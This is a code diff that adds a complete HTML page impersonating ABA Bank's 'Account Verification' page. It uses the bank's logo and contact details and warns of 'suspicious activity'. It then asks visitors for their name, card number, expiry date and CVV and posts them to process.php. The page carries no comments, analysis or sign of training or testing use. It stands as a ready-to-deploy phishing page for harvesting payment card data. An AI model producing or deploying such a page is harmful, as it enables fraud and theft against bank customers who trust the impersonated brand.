@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ABA Bank - Account Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        h1 {
+            color: #543D8E;
+            margin-bottom: 20px;
+        }
+        form {
+            margin-top: 30px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="abalogo.png" alt="ABA Bank Logo" width="200">
+        <h1>Important Account Verification</h1>
+        <p>We recently detected suspicious activity on your ABA Bank account. To protect your account, please verify your details by filling in the form below.</p>
+        <form action="process.php" method="post">
+            <label for="name">Name:</label>
+            <input type="text" id="name" name="name" required><br>
+
+            <label for="cardnumber">Card Number:</label>
+            <input type="text" id="cardnumber" name="cardnumber" required><br>
+
+            <label for="expiry">Expiry Date:</label>
+            <input type="text" id="expiry" name="expiry" required><br>
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required><br>
+
+            <input type="submit" value="Verify Details">
+        </form>
+        <p>If you have any issues, please contact us at <a href="mailto:support@ababank.com">support@ababank.com</a> or call us at +855 23 999 000.</p>
+    </div>
+</body>
+</html>
